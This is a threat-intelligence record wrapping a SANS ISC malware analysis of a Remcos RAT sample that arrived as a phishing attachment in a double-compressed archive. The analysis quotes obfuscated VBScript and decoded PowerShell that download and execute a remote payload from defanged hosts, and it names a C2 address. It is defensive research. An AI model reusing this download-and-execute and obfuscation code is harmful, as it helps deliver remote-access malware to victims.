{
    "id": "aed1719f-216c-4ef3-bb74-1f4c9d5177b3",
    "created_at": "2023-01-12T15:04:33.176526Z",
    "updated_at": "2025-03-27T02:05:55.890995Z",
    "deleted_at": null,
    "sha1_hash": "5124d7b246be464c2ace20ebab7e31f83e2d5c03",
    "title": "2022-02-18 - Remcos RAT Delivered Through Double Compressed Archive",
    "authors": "",
    "file_creation_date": "2022-05-28T15:58:15Z",
    "file_modification_date": "2022-05-28T15:58:15Z",
    "file_size": 101326,
    "plain_text": "# SANS ISC: Remcos RAT Delivered Through Double Compressed Archive - SANS Internet Storm Center SANS Site Network Current Site SANS Internet Storm Center Other SANS Sites Help Graduate Degree Programs Security Training Security Certification Security Awareness Training Penetration Testing Industrial Control Systems Cyber Defense Foundations DFIR Software Security Government OnSite Training SANS ISC InfoSec Forums\n\n**[isc.sans.edu/forums/diary/Remcos+RAT+Delivered+Through+Double+Compressed+Archive/28354/](https://isc.sans.edu/forums/diary/Remcos+RAT+Delivered+Through+Double+Compressed+Archive/28354/)**\n\n## Remcos RAT Delivered Through Double Compressed Archive\n\n One of our readers shared an interesting sample received via email. Like him, if you get access to interesting/suspicious data, please share it with\n\n The file was received as an attachment to a mail that pretended to be related to a purchase order. The file was called “P0-65774383__pdf.tar.lz” (\n```\n remnux@remnux:/MalwareZoo/20220215$ lunzip -l P0-65774383__pdf.tar.lz\n  uncompressed   compressed  saved name\n      10240      1362 86.70% P0-65774383__pdf.tar.lz\n remnux@remnux:/MalwareZoo/20220215$ file P0-65774383__pdf.tar.lz\n P0-65774383__pdf.tar.lz: lzip compressed data, version: 1\n\n This is a strange way to deliver the payload because files with the extension '.lz' are not supported by default on Windows systems. There is no to\n\n Let’s decompress it and untar it:\n remnux@remnux:/MalwareZoo/20220215$ lunzip P0-65774383__pdf.tar.lz\n remnux@remnux:/MalwareZoo/20220215$ file P0-65774383__pdf.tar\n P0-65774383__pdf.tar: POSIX tar archive (GNU)\n remnux@remnux:/MalwareZoo/20220215$ tar xvf P0-65774383__pdf.tar\n ./\n ./Protected Client.vbs\n\n The ‘Protected Client.vbs’ script is nicely obfuscated.\n\n Sensitive strings (that could reveal the purpose of the script) are encoded and decoded using the following function:\n\n```\n\n-----\n\n```\n For iChar = 1 To Len(sData) Step 2\n  pGwFuYQQKTRe = Chr(\"&H\" & Mid(sData, iChar, 2))\n  fQMBscV = fQMBscV & pGwFuYQQKTRe\n Next\n MpGGKjWFHKaZCsd = fQMBscV\nEnd Function\n\n## It’s a simple hex-encoding! Nothing fancy! But the interesting technique is the following, based on GetObject[1]. This function is used to obtain a r\nSet YXHivrLSJ = GetObject(“new:F5078F32-C551-11D3-89B9-0000F81FE221”)\n\n This UUID correspond to the ProgID 'MSXML2.XMLHTTP.3.0' as referenced in the Microsoft documentation[2].\n\n Then, the object is populated with malicious content loaded from the following URL:\nExecute(\"YXHivrLSJ.Load “hxxp://kastex[.]me/bkp/ybn.jpg'\nExecute(\"YXHivrLSJ.transformNode (YXHivrLSJ)\")\n\n The URL returns the XML content expected by the object. The file contains a Powershell payload, again hex-encoded:\nvar yy=r.ShellExecute(\"powershell.exe\",nm12er7fdffff(\"2467663D2830303130303130302C30313030303130312C30313131303031302C3031313130303130\n\n Once extracted, it contains:\n$uJmg=\n(01100110,01110101,01101110,01100011,01110100,01101001,01101111,01101110,00100000,01110100,01001101,01000011,01100110,01101011,0101001\n1001, \n... \n,00001010,01111101) | %{ [System.Text.Encoding]::UTF8.GetString([System.Convert]::ToInt32($_,2)) };I`E`X([system.String]::Join('', $uJ\n\n Decode and beautified, we have this code:\n$ErrorActionPreference = 'SilentlyContinue';\n$t56fg = [Enum]::ToObject([System.Net.SecurityProtocolType], 3072);[System.Net.ServicePointManager]::SecurityProtocol = $t56fg;\n'[void] [System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')'|IEX;\ndo {\n  $ping = test-connection -comp google.com -count 1 -Quiet\n} until ($ping);\n$tty='(NewObject Net.WebClient)' | IEX;\n$mv= [Microsoft.VisualBasic.Interaction]::CallByname($tty,'DownloadString',[Microsoft.VisualBasic.CallType]::Method,'hxxp://www[.]srbi\n\n The site has already been cleaned and the payload deleted but, with a bit of hunting on VT, it’s possible to get a copy of the payload. It’s another p analysis, it's a Remcos[3] RAT sample (C2: notme[.]linkpc[.]net:4376).\n\n [1] https://docs.microsoft.com/en-us/office/vba/language/reference/user-interface-help/getobject-function\n [2] https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms766426(v=vs.85)\n [3] https://malpedia.caad.fkie.fraunhofer.de/details/win.remcos\n\n Xavier Mertens (@xme) Xameco Senior ISC Handler - Freelance Cyber Security Consultant PGP Key\n\n I will be teaching next: Reverse-Engineering Malware: Malware Analysis Tools and Techniques - SANS London June 2022\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-02-18 - Remcos RAT Delivered Through Double Compressed Archive.pdf"
    ],
    "report_names": [
        "2022-02-18 - Remcos RAT Delivered Through Double Compressed Archive.pdf"
    ],
    "threat_actors": [
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535873,
    "ts_updated_at": 1743041155,
    "ts_creation_date": 1653753495,
    "ts_modification_date": 1653753495,
    "files": {
        "pdf": "https://archive.orkl.eu/5124d7b246be464c2ace20ebab7e31f83e2d5c03.pdf",
        "text": "https://archive.orkl.eu/5124d7b246be464c2ace20ebab7e31f83e2d5c03.txt",
        "img": "https://archive.orkl.eu/5124d7b246be464c2ace20ebab7e31f83e2d5c03.jpg"
    }
}